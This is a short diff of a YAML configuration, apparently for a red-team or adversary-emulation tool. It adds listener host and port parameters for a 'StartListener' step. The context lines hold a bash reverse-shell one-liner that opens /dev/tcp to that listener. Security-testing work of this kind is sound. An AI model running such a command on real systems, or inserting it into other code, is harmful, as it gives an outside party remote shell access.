@@ -7,6 +7,13 @@ args:
   DST_BIN: "/tmp/pause"
 # command: "StartListener"
 # effects: ["ListenerReady"]
+parameters:
+  LISTENER:
+    type: string
+    description: the URL of the listener catching the reverse shell
+  LISTENER_PORT:
+    type: int
+    description: the listing port number
 cmdVariants:
   - key: bash
     Command: bash >& /dev/tcp/${LISTENER}/${LISTENER_PORT} 0>&1 &
